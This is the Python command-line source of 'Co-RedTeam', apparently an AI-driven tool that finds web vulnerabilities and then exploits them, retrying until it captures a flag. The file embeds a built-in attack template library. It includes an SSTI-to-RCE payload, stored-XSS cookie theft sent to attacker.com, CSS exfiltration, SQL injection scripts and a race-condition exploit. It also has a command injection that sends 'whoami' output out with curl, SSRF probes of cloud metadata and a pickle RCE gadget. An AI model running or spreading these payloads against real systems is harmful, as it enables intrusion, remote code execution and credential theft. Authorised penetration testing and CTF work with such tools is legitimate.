#!/usr/bin/env python3
"""Co-RedTeam CLI

Usage:
    python cli.py audit  --target TARGET_DIR           # Phase 1 vuln discovery
    python cli.py exploit --url URL [--confirmed PATH] # Phase 2 exploitation (URL whitelist lock)
    python cli.py memory list                          # list attack templates
    python cli.py memory show TEMPLATE_ID
    python cli.py memory add FILE.yaml
    python cli.py memory remove TEMPLATE_ID
    python cli.py memory export TEMPLATE_ID [OUTPUT]
    python cli.py memory import FILE.yaml
    python cli.py memory query --cwe CWE-79 [--tag TAG] [--severity SEVERITY]
    python cli.py memory stats
    python cli.py memory init-builtin
"""

from __future__ import annotations

import argparse
import os
import sys
from pathlib import Path

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

_B_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(_B_ROOT))

from core.target_context import lock_target, TargetLockError
from core.ui import (
    console,
    fail,
    muted,
    ok,
    render_target_lock,
    stage,
    warn,
)


def _render_exploit_banner(url: str, vuln_path: str | None, challenge: str) -> None:
    from rich.panel import Panel
    from rich.text import Text
    body = Text()
    body.append("Target   ", style="grey50")
    body.append(url + "\n", style="bold white")
    body.append("Vulns    ", style="grey50")
    body.append((vuln_path or "data/confirmed_vuln.json") + "\n", style="bold white")
    body.append("Adapter  ", style="grey50")
    body.append(challenge + "\n", style="bold white")
    console.print(Panel(
        body,
        title="[bold magenta]Co-RedTeam  Phase 2 — Exploitation[/bold magenta]",
        border_style="magenta",
        padding=(0, 2),
    ))


# ---------------------------------------------------------------------------
#  audit  (Phase 1 — static vulnerability discovery)
# ---------------------------------------------------------------------------

def cmd_audit(args: argparse.Namespace) -> int:
    """Run Phase 1 static analysis on a target codebase."""
    import subprocess

    phase1_root = _B_ROOT.parent
    main_script = phase1_root / "main.py"

    if not main_script.exists():
        fail(f"Phase 1 entry not found: {main_script}")
        return 1

    target_dir = args.target or "target_codebase"
    stage("Audit", f"Starting Phase 1 discovery engine -> target={target_dir}")

    env = os.environ.copy()
    if args.mock:
        env["CO_REDTEAM_MOCK_LLM"] = "true"
        muted("Mock mode enabled (no LLM calls)")

    result = subprocess.run(
        [sys.executable, str(main_script)],
        cwd=str(phase1_root),
        env=env,
    )

    if result.returncode == 0:
        ok("Phase 1 complete. Report written to reports/")
    else:
        fail(f"Phase 1 exited with code: {result.returncode}")

    return result.returncode


# ---------------------------------------------------------------------------
#  exploit  (Phase 2 — dynamic exploitation with mandatory URL lock)
# ---------------------------------------------------------------------------

def cmd_exploit(args: argparse.Namespace) -> int:
    """Run Phase 2 exploitation pipeline with a mandatory target URL lock."""
    try:
        target = lock_target(args.url)
    except TargetLockError as e:
        fail(str(e))
        return 2

    challenge = getattr(args, "challenge", "generic")
    vuln_arg  = getattr(args, "vuln", None)

    _render_exploit_banner(args.url, vuln_arg, challenge)
    render_target_lock(target)

    # Resolve vuln file: --vuln > --confirmed > default data/confirmed_vuln.json
    raw_path = vuln_arg or getattr(args, "confirmed", None)
    if raw_path:
        confirmed_path = Path(raw_path)
    else:
        confirmed_path = _B_ROOT / "data" / "confirmed_vuln.json"

    if not confirmed_path.exists():
        fail(
            f"[!] 找不到漏洞报告: {confirmed_path}\n"
            "    请先运行 Phase 1: python cli.py audit --target <TARGET_DIR>"
        )
        return 1

    import core.adapters  # noqa: F401
    from coordinator import run_pipeline
    from agents.consolidator import run_seed_warmup

    # ── Phase 2 预热：在 Planner 循环前生成可执行种子模板 ──
    warmup_results = run_seed_warmup(confirmed_path)
    if warmup_results:
        ok(f"Seed warmup generated {len(warmup_results)} executable templates: "
           f"{', '.join(warmup_results.keys())}")
    else:
        muted("Seed warmup skipped or produced no templates — Planner will start cold.")

    max_runs = int(os.environ.get("CO_REDTEAM_MAX_RUNS", "5"))
    stage("CLI", f"Starting Phase 2 pipeline (challenge={challenge}, max_runs={max_runs})...")

    best_result = 3
    for run_idx in range(1, max_runs + 1):
        console.print(f"\n[bold cyan]========== OUTER RUN {run_idx}/{max_runs} ==========[/bold cyan]")
        result = run_pipeline(
            confirmed_path=confirmed_path,
            challenge_name=challenge,
            target=target,
        )
        best_result = result
        if result == 0:
            ok(f"SUCCESS on outer run {run_idx}/{max_runs}! Flag captured.")
            return 0
        else:
            if run_idx < max_runs:
                warn(f"Run {run_idx}/{max_runs} ended without flag. Retrying with updated memory...")

    fail(f"All {max_runs} outer runs exhausted without confirmed success.")
    return best_result


# ---------------------------------------------------------------------------
#  memory  (attack template management)
# ---------------------------------------------------------------------------

def _get_mgr():
    from core.template_manager import TemplateManager
    return TemplateManager()


def cmd_memory_list(args: argparse.Namespace) -> int:
    mgr = _get_mgr()
    templates = mgr.list_templates()

    if not templates:
        warn("No templates found. Run: python cli.py memory init-builtin")
        return 0

    console.print(f"\n[bold]Attack Template Library[/bold] ({len(templates)} templates)\n")
    from rich.table import Table
    table = Table(show_lines=False)
    table.add_column("ID", style="cyan", no_wrap=True)
    table.add_column("Name")
    table.add_column("CWE", style="yellow")
    table.add_column("Severity", style="magenta")
    table.add_column("Tags", style="grey50")

    for t in templates:
        cwe_str = ",".join(t["cwe_ids"][:2])
        if len(t["cwe_ids"]) > 2:
            cwe_str += f"+{len(t['cwe_ids'])-2}"
        tags_str = ",".join(t["tags"][:3]) if t["tags"] else "-"
        table.add_row(t["id"], t["name"], cwe_str, t["severity"], tags_str)

    console.print(table)
    muted("Use 'python cli.py memory show <ID>' for full content")
    return 0


def cmd_memory_show(args: argparse.Namespace) -> int:
    mgr = _get_mgr()
    data = mgr.export_template(args.template_id)

    if not data:
        fail(f"Template not found: {args.template_id}")
        return 1

    from rich.panel import Panel
    meta = data["metadata"]
    lines = []
    for key, value in meta.items():
        v = ", ".join(value) if isinstance(value, list) else str(value)
        lines.append(f"[bold]{key}[/bold]: {v}")
    header = "\n".join(lines)
    console.print(Panel(
        header + "\n\n" + data["content"],
        title=f"[cyan]{args.template_id}[/cyan]",
    ))
    return 0


def cmd_memory_add(args: argparse.Namespace) -> int:
    import yaml
    path = Path(args.file)
    if not path.exists():
        fail(f"File not found: {path}")
        return 1
    with open(path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)
    mgr = _get_mgr()
    metadata = data.get("metadata", {})
    result_path = mgr.add_template(
        template_id=metadata.get("id", ""),
        name=metadata.get("name", ""),
        content=data.get("content", ""),
        cwe_ids=metadata.get("cwe_ids", []),
        target_type=metadata.get("target_type", "generic"),
        tags=metadata.get("tags", []),
        author=metadata.get("author", "cli-user"),
        severity=metadata.get("severity", "medium"),
    )
    ok(f"Added: {result_path}")
    return 0


def cmd_memory_remove(args: argparse.Namespace) -> int:
    mgr = _get_mgr()
    if mgr.remove_template(args.template_id):
        ok(f"Removed: {args.template_id}")
        return 0
    fail(f"Not found: {args.template_id}")
    return 1


def cmd_memory_export(args: argparse.Namespace) -> int:
    import yaml
    mgr = _get_mgr()
    data = mgr.export_template(args.template_id)
    if not data:
        fail(f"Not found: {args.template_id}")
        return 1
    output = args.output or f"{args.template_id}.yaml"
    with open(output, "w", encoding="utf-8") as f:
        yaml.dump(data, f, allow_unicode=True, default_flow_style=False, sort_keys=False)
    ok(f"Exported to: {output}")
    return 0


def cmd_memory_import(args: argparse.Namespace) -> int:
    import yaml
    path = Path(args.file)
    if not path.exists():
        fail(f"File not found: {path}")
        return 1
    with open(path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)
    mgr = _get_mgr()
    template = mgr.import_template(data)
    if template:
        ok(f"Imported: {template.id}")
        return 0
    fail("Import failed: invalid format")
    return 1


def cmd_memory_query(args: argparse.Namespace) -> int:
    mgr = _get_mgr()
    results = mgr.query_templates(
        cwe_id=args.cwe or "",
        tag=args.tag or "",
        severity=args.severity or "",
    )
    if not results:
        filters = []
        if args.cwe:
            filters.append(f"CWE={args.cwe}")
        if args.tag:
            filters.append(f"tag={args.tag}")
        if args.severity:
            filters.append(f"severity={args.severity}")
        warn(f"No match (filter: {', '.join(filters)})")
        return 0

    console.print(f"\n[bold]Found {len(results)} template(s)[/bold]\n")
    for t in results:
        console.print(
            f"  [[magenta]{t.severity.upper()}[/magenta]] [cyan]{t.id}[/cyan]: {t.name}"
        )
        console.print(f"    CWE: {', '.join(t.cwe_ids)} | Tags: {', '.join(t.tags)}\n")
    return 0


def cmd_memory_stats(args: argparse.Namespace) -> int:
    mgr = _get_mgr()
    stats = mgr.get_stats()

    from rich.table import Table
    console.print("\n[bold]Template Library Stats[/bold]\n")
    console.print(f"  Total: [bold]{stats['total']}[/bold] templates\n")

    t1 = Table(title="By CWE", show_lines=False)
    t1.add_column("CWE")
    t1.add_column("Count", justify="right")
    for cwe, count in sorted(stats["by_cwe"].items()):
        t1.add_row(cwe, str(count))
    console.print(t1)

    t2 = Table(title="By Severity", show_lines=False)
    t2.add_column("Severity")
    t2.add_column("Count", justify="right")
    for sev, count in sorted(stats["by_severity"].items()):
        t2.add_row(sev, str(count))
    console.print(t2)

    tag_counts: dict[str, int] = {}
    for t in mgr.templates.values():
        for tag in t.tags:
            tag_counts[tag] = tag_counts.get(tag, 0) + 1
    if tag_counts:
        t3 = Table(title="Top Tags", show_lines=False)
        t3.add_column("Tag")
        t3.add_column("Count", justify="right")
        for tag, count in sorted(tag_counts.items(), key=lambda x: -x[1])[:10]:
            t3.add_row(tag, str(count))
        console.print(t3)

    return 0



_BUILTIN_TEMPLATES = [
    {
        "metadata": {
            "id": "cwe-94-ssti",
            "name": "SSTI/Template Injection",
            "cwe_ids": ["CWE-94", "CWE-917"],
            "target_type": "generic",
            "tags": ["ssti", "jinja2", "twig", "freemarker", "rce", "template-injection"],
            "author": "co-redteam",
            "severity": "critical",
        },
        "content": """Common trigger points: email rendering, page templates, PDF generation, log messages.
Frameworks: Jinja2 (Flask/Django), Twig (PHP), ERB (Ruby), Freemarker (Java), Thymeleaf (Spring)

Detection payloads:
{{7*7}}   -> expect 49 (Jinja2/Twig)
${7*7}    -> expect 49 (Freemarker)
#{7*7}    -> expect 49 (Thymeleaf)

Jinja2 SSTI->RCE (adjust field names per target evidence):
import requests,urllib3,json; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
r=requests.post(f'{base}{INJECTION_ENDPOINT}', data={'FIELD_NAME':payload+'@x.com','OTHER':'values'}, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+json.dumps({'status':r.status_code,'body':r.text[:300]}))

Key notes:
- SSTI output usually NOT returned in HTTP response! Need exfiltration via XSS/SSRF/file-write/DNS
- Use attack_chain from confirmed_vuln.json to identify exact injection point and trigger path
- If email-related: payload injected at registration/profile update, triggered when email is rendered/sent
""",
    },
    {
        "metadata": {
            "id": "cwe-79-xss-css",
            "name": "XSS / CSS Injection / Data Exfiltration",
            "cwe_ids": ["CWE-79"],
            "target_type": "generic",
            "tags": ["xss", "css-injection", "stored-xss", "dom-based", "token-exfil", "admin-bot", "service-worker"],
            "author": "co-redteam",
            "severity": "critical",
        },
        "content": """Categories and exploitation scenarios:

1. Stored XSS (persistent):
   - User profile, comments, product descriptions stored and viewed by others/admin
   - Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
   - Or: <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

2. CSS Attribute Selector Exfiltration (stealing hidden values):
   When page contains sensitive values in HTML elements like <input value="SECRET">:
   input[value^="a"] { background:url(https://attacker.com/char?a) }
   input[value^="ab"] { background:url(https://attacker.com/prefix?ab) }
   On match browser auto-sends request, leaking token/secret character by character.

3. DOM-based XSS:
   Dangerous functions: innerHTML, document.write(), eval(), setTimeout(), location.hash
   Find unsanitized user input directly inserted into DOM

4. Service Worker injection:
   If app registers SW and SW source is controllable, can hijack all network requests
   Inject malicious SW to intercept requests, steal cookies, modify responses

Generic exploitation flow:
Step 1 - Inject payload into storable field (note/description/bio/name/etc.)
Step 2 - Trigger admin/Bot to visit page containing payload (report feature, share link, etc.)
Step 3 - Receive stolen data on attacker server (cookie/token/session)
Step 4 - Use stolen credentials for privilege escalation
""",
    },
    {
        "metadata": {
            "id": "cwe-89-sqli",
            "name": "SQL Injection",
            "cwe_ids": ["CWE-89"],
            "target_type": "generic",
            "tags": ["sqli", "sql-injection", "union-select", "blind", "time-blind", "auth-bypass"],
            "author": "co-redteam",
            "severity": "critical",
        },
        "content": """Quick test: ' OR '1'='1'-- / " OR "1"="1
Automated: sqlmap -u "URL" --batch --level=2 --risk=2 [--force-ssl]

Manual injection process:
1. Identify injection point (params/Headers/Cookie)
2. Determine DB type (error message diff / comment syntax / built-in functions)
3. Count columns: ORDER BY 1,2,3...
4. Extract DB name / table name / column name
5. Dump sensitive data (credentials/flags)

Time-based blind example:
import requests,urllib3,time; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
payload="' AND IF(1=1,SLEEP(5),0)-- "
start=time.time(); r=requests.get(f'{base}{ENDPOINT}?id={payload}', verify={VERIFY_FLAG}); elapsed=time.time()-start
print('###CHAIN_OUTPUT###'+str({'elapsed':elapsed,'is_blind':elapsed>4}))
""",
    },
    {
        "metadata": {
            "id": "cwe-362-race-condition",
            "name": "Race Condition / TOCTOU",
            "cwe_ids": ["CWE-362"],
            "target_type": "generic",
            "tags": ["race-condition", "toc-tou", "concurrent", "privilege-escalation", "threading"],
            "author": "co-redteam",
            "severity": "high",
        },
        "content": """Typical scenarios:
- File upload: TOCTOU race between check and use
- Permission change: non-atomic check-then-update operations
- Resource allocation: concurrent requests competing for same resource
- State transition: payment/approval multi-state systems

Generic exploit framework (Python threading):
import requests,urllib3,json,threading,time; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
s=requests.Session(); s.verify={VERIFY_FLAG}
results=[]; errors=[]
def race_req(payload_data, label):
    try:
        r=s.post(f'{base}{RACE_ENDPOINT}', data=payload_data, cookies=s.cookies)
        results.append((label,r.status_code,r.text[:200]))
    except Exception as e: errors.append(str(e))
threads=[threading.Thread(target=race_req,args=(data1,'req1')), threading.Thread(target=race_req,args=(data2,'req2'))]
[t.start() for t in threads]; [t.join() for t in threads]
print('###CHAIN_OUTPUT###'+json.dumps({'results':results,'errors':errors}))

Key points:
- Concurrent threads typically 10-50, depends on TOCTOU window size
- Two requests MUST have conflicting params (one legitimate, one privilege-escalating)
- Multiple retry loops needed (race window may be milliseconds)
- Success indicator: response shows trace of escalated operation
""",
    },
    {
        "metadata": {
            "id": "cwe-352-csrf-bypass",
            "name": "CSRF Protection Bypass",
            "cwe_ids": ["CWE-352"],
            "target_type": "generic",
            "tags": ["csrf", "bypass", "token-theft", "jwt", "same-site", "referer-check"],
            "author": "co-redteam",
            "severity": "high",
        },
        "content": """Common CSRF protection mechanisms and bypass methods:

1. Token validation (Referer/Origin check):
   - Bypass: if token obtainable via XSS/CSS injection, construct full CSRF request
   - Bypass: if token validation loose (accepts empty/arbitrary values)

2. SameSite Cookie:
   - Strict: fully blocks cross-site (hardest)
   - Lax: GET requests cross-site OK (combine with open redirect)
   - None: no protection (requires Secure flag + HTTPS)

3. JWT-contained CSRF token:
   - If JWT in non-HttpOnly cookie, JS readable
   - Extract CSRF token from JWT via XSS/CSS injection
   - Construct valid request with extracted token

4. Double-submit pattern (cookie + header):
   - Try satisfying only one side
   - Check if either can be predicted/forged

Generic bypass flow:
A - Obtain CSRF token through other vulnerability (XSS/CSS injection)
B - Analyze token generation logic, try prediction/forgery
C - Find API endpoints missing token requirement (oversight)
D - If dual-token mechanism (cookie+header), try partial satisfaction
""",
    },
    {
        "metadata": {
            "id": "cwe-434-file-upload",
            "name": "File Upload Vulnerability",
            "cwe_ids": ["CWE-434"],
            "target_type": "generic",
            "tags": ["file-upload", "path-traversal", "magic-bytes", "exiftool", "imagemagick", "webshell", "rce"],
            "author": "co-redteam",
            "severity": "critical",
        },
        "content": """Attack vectors:

1. Path traversal (../../../):
   - filename param inject ../ to write arbitrary location
   - Target: webshell (.php/.jsp/.asp), config overwrite, cron job

2. File type forgery:
   - Magic bytes: %PDF- (PDF), GIF89a (GIF), PK\\x03\\x04 (ZIP)
   - Double extension: shell.php.jpg (Apache parse vuln)
   - Null byte truncation: shell.php%00.jpg (old versions)

3. Metadata/header injection:
   - ExifTool processing JPEG/PDF allows command injection
   - SVG files embed JavaScript
   - Office macros (.docm/.xlsm)

4. Stored XSS via filename:
   - Filename reflected in HTML without escaping

Generic test flow:
Step 1 - Upload normal file to confirm functionality
Step 2 - Try magic bytes forgery (%PDF- prefix + malicious content)
Step 3 - Try path traversal (filename=../../evil.php)
Step 4 - Try metadata injection (if ExifTool/ImageMagick processes file)
Step 5 - If parse/preview function exists, try corresponding format RCE
""",
    },
    {
        "metadata": {
            "id": "cwe-78-command-injection",
            "name": "OS Command Injection",
            "cwe_ids": ["CWE-78"],
            "target_type": "generic",
            "tags": ["command-injection", "rce", "blind-injection", "pipe", "backtick"],
            "author": "co-redteam",
            "severity": "critical",
        },
        "content": """Separators: ; & && | || $() ` \\n %0a %0d
Test payloads: ;whoami / $(whoami) / `whoami` / | whoami
Blind techniques: sleep 5 / ping -c 5 attacker.com (timing side-channel)

Example:
import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
r=requests.get(f'{base}{ENDPOINT}?cmd=;cat+/flag', verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+str({'status':r.status_code,'body':r.text[:500]}))

Out-of-band (OOB) detection when blind:
; curl https://attacker.com/ping?$(whoami | base64)
; nsync $(whoami).attacker.com
""",
    },
    {
        "metadata": {
            "id": "cwe-918-ssrf",
            "name": "Server-Side Request Forgery",
            "cwe_ids": ["CWE-918"],
            "target_type": "generic",
            "tags": ["ssrf", "internal-probe", "cloud-metadata", "dns-rebinding", "waf-bypass"],
            "author": "co-redteam",
            "severity": "high",
        },
        "content": """Internal probing targets:
127.0.0.1:6379 (Redis), localhost:3306 (MySQL), localhost:8080, localhost:22
Cloud metadata endpoints:
169.254.169.254/latest/meta-data/ (AWS/GCP/Azure)

WAF bypass techniques:
- Decimal IP: 2130706433 = 127.0.0.1
- Short URL redirect
- DNS rebinding
- IPv6 shorthand: ::1, 0:0:0:0:0:0:0:1
- URL encoding variations

Example:
import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
targets=['http://127.0.0.1:22','http://127.0.0.1:3306','http://169.254.169.254/latest/meta-data/']
for t in targets:
    r=requests.get(f'{base}{ENDPOINT}?url={t}', verify={VERIFY_FLAG}, timeout=5)
    print('###CHAIN_OUTPUT###'+str({'target':t,'status':r.status_code,'len':len(r.text),'body':r.text[:200]}))
""",
    },
    {
        "metadata": {
            "id": "cwe-502-deserialization",
            "name": "Insecure Deserialization",
            "cwe_ids": ["CWE-502"],
            "target_type": "generic",
            "tags": ["deserialization", "pickle", "java-gadget", "php-pop-chain", "yaml", "rce"],
            "author": "co-redteam",
            "severity": "critical",
        },
        "content": """Pickle (Python):
import pickle, base64; class RCE(object): def __reduce__(self): return (os.system, ('cmd',)); print(base64.b64encode(pickle.dumps(RCE())))

Java: ysoserial tool generates gadget chains (CommonsCollections, Spring, etc.)
PHP: unserialize() + POP chain construction
Ruby: Marshal.load() gadget chains
Node.js: unsafe deserialization of user-controlled JSON

Key requirements:
- Must know target library version for correct gadget chain
- Often combined with file upload (upload serialized object)
- May need information disclosure first to identify libraries/versions
""",
    },
    {
        "metadata": {
            "id": "cwe-601-open-redirect",
            "name": "Open Redirect",
            "cwe_ids": ["CWE-601"],
            "target_type": "generic",
            "tags": ["open-redirect", "phishing", "oauth-theft", "url-param", "callback"],
            "author": "co-redteam",
            "severity": "medium",
        },
        "content": """Test: modify url/redirect/next/target/callback/return_to parameter to external domain
import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
r=requests.get(f'{base}{REDIRECT_ENDPOINT}?url=https://evil.com', allow_redirects=False, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+str({'status':r.status_code,'location':r.headers.get('Location')}))

Exploitation scenarios:
- Phishing attacks (disguise malicious URLs behind trusted domain)
- OAuth token theft (redirect URI manipulation)
- Referer/Origin header bypass for CSRF
- Combined with XSS for more complex attacks
""",
    },
]


def cmd_memory_init_builtin(args: argparse.Namespace) -> int:
    import yaml
    mgr = _get_mgr()
    builtin_dir = mgr.templates_dir / "builtin"
    builtin_dir.mkdir(parents=True, exist_ok=True)

    count = 0
    for tpl in _BUILTIN_TEMPLATES:
        metadata = tpl["metadata"]
        tid = metadata["id"]
        output_file = builtin_dir / f"{tid}.yaml"

        if output_file.exists():
            muted(f"  skip existing: {tid}")
            continue

        with open(output_file, "w", encoding="utf-8") as f:
            yaml.dump(tpl, f, allow_unicode=True, default_flow_style=False, sort_keys=False)
        count += 1
        ok(f"  created: {tid}")

    mgr.load_all()
    total = len(mgr.templates)
    ok(f"Done! {count} new templates created, {total} total available")
    muted(f"Directory: {builtin_dir}")
    return 0


# ---------------------------------------------------------------------------
#  Argument parser
# ---------------------------------------------------------------------------

def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="cli.py",
        description="Co-RedTeam — automated vulnerability discovery & exploitation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s audit --target target_codebase/
  %(prog)s exploit --url http://192.168.1.100:9443
  %(prog)s exploit --url https://目标IP:端口 --vuln data/confirmed_vuln.json
  %(prog)s exploit --url https://目标IP:端口 --confirmed data/confirmed_vuln.json
  %(prog)s memory list
  %(prog)s memory show cwe-94-ssti
  %(prog)s memory query --cwe CWE-79
  %(prog)s memory init-builtin
""",
    )
    sub = parser.add_subparsers(dest="command", metavar="COMMAND")

    # -- audit ---------------------------------------------------------------
    p_audit = sub.add_parser("audit", help="Phase 1: static vulnerability discovery")
    p_audit.add_argument("--target", "-t", default=None, metavar="DIR",
                         help="Target codebase directory (default: target_codebase)")
    p_audit.add_argument("--mock", "-m", action="store_true",
                         help="Mock mode: skip LLM calls, use simulated data")
    p_audit.set_defaults(func=cmd_audit)

    # -- exploit -------------------------------------------------------------
    p_exploit = sub.add_parser("exploit", help="Phase 2: dynamic exploitation (URL whitelist locked)")
    p_exploit.add_argument("--url", required=True, metavar="URL",
                           help="Target URL — REQUIRED. All network access is locked to this host.")
    p_exploit.add_argument("--vuln", default=None, metavar="PATH",
                           help="Path to confirmed_vuln.json (alias for --confirmed)")
    p_exploit.add_argument("--confirmed", default=None, metavar="PATH",
                           help="Path to confirmed_vuln.json (default: data/confirmed_vuln.json)")
    p_exploit.add_argument("--challenge", default="generic", metavar="NAME",
                           help="Challenge adapter name (default: generic)")
    p_exploit.set_defaults(func=cmd_exploit)

    # -- memory --------------------------------------------------------------
    p_mem = sub.add_parser("memory", help="Attack template management")
    mem_sub = p_mem.add_subparsers(dest="memory_command", metavar="SUBCOMMAND")

    mem_sub.add_parser("list", help="List all templates").set_defaults(func=cmd_memory_list)

    p_show = mem_sub.add_parser("show", help="Show template details")
    p_show.add_argument("template_id")
    p_show.set_defaults(func=cmd_memory_show)

    p_add = mem_sub.add_parser("add", help="Add template from YAML file")
    p_add.add_argument("file")
    p_add.set_defaults(func=cmd_memory_add)

    p_remove = mem_sub.add_parser("remove", help="Remove template")
    p_remove.add_argument("template_id")
    p_remove.set_defaults(func=cmd_memory_remove)

    p_export = mem_sub.add_parser("export", help="Export template to YAML")
    p_export.add_argument("template_id")
    p_export.add_argument("output", nargs="?", help="Output file (default: <id>.yaml)")
    p_export.set_defaults(func=cmd_memory_export)

    p_import = mem_sub.add_parser("import", help="Import template from YAML")
    p_import.add_argument("file")
    p_import.set_defaults(func=cmd_memory_import)

    p_query = mem_sub.add_parser("query", help="Query templates by filter")
    p_query.add_argument("--cwe", help="Filter by CWE ID (e.g. CWE-79)")
    p_query.add_argument("--tag", help="Filter by tag (e.g. ssti)")
    p_query.add_argument("--severity", help="Filter by severity (critical/high/medium/low)")
    p_query.set_defaults(func=cmd_memory_query)

    mem_sub.add_parser("stats", help="Show statistics").set_defaults(func=cmd_memory_stats)
    mem_sub.add_parser("init-builtin", help="Initialize built-in CWE templates").set_defaults(
        func=cmd_memory_init_builtin
    )

    return parser


def main() -> int:
    parser = _build_parser()
    args = parser.parse_args()

    if not hasattr(args, "func"):
        # No subcommand given — show help for the relevant level
        if args.command == "memory":
            # memory was given but no sub-subcommand
            parser.parse_args(["memory", "--help"])
        else:
            parser.print_help()
        return 0

    try:
        return args.func(args)
    except KeyboardInterrupt:
        warn("\nCancelled")
        return 130
    except Exception as e:
        fail(f"Error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())

